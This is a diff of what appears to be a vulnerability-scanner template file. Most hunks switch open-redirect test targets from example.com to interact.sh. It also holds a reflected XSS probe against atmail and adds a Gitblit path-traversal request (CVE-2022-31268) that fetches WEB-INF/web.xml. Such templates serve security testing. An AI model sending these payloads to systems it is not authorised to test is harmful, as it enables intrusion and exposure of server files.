         {
           "raw": [
-            "GET / HTTP/1.1\nHost: {{Hostname}}\nX-Forwarded-Host: //example.com\n"
+            "GET / HTTP/1.1\nHost: {{Hostname}}\nX-Forwarded-Host: //interact.sh\n"
           ]
         }
       ]
@@ -16959,7 +16975,7 @@
         {
           "method": "GET",
           "path": [
-            "{{BaseURL}}/lab.html?vpath=//example.com"
+            "{{BaseURL}}/lab.html?vpath=//interact.sh"
           ]
         }
       ]
@@ -17067,7 +17083,7 @@
         {
           "method": "GET",
           "path": [
-            "{{BaseURL}}/boafrm/formWlanRedirect?redirect-url=http://example.com&wlan_id=1"
+            "{{BaseURL}}/boafrm/formWlanRedirect?redirect-url=http://interact.sh&wlan_id=1"
           ]
         }
       ]
@@ -17203,7 +17219,7 @@
         {
           "method": "GET",
           "path": [
-            "{{BaseURL}}/wp-admin/admin-ajax.php?action=kc_get_thumbn&id=https://example.com"
+            "{{BaseURL}}/wp-admin/admin-ajax.php?action=kc_get_thumbn&id=https://interact.sh"
           ]
         }
       ]
@@ -17508,7 +17524,7 @@
         {
           "method": "GET",
           "path": [
-            "{{BaseURL}}/index.php/example.com"
+            "{{BaseURL}}/index.php/interact.sh"
           ]
         }
       ]
@@ -17523,7 +17539,7 @@
         {
           "method": "GET",
           "path": [
-            "{{BaseURL}}/index.php/example.com"
+            "{{BaseURL}}/index.php/interact.sh"
           ]
         }
       ]
@@ -18373,6 +18389,21 @@
           "method": "GET",
           "path": [
             "{{BaseURL}}/atmail/index.php/admin/index/?error=1%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2022-31268",
+      "info": {
+        "name": "Gitblit 1.9.3 - Path traversal",
+        "severity": "high"
+      },
+      "requests": [
+        {
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/resources//../WEB-INF/web.xml"
           ]
         }
       ]
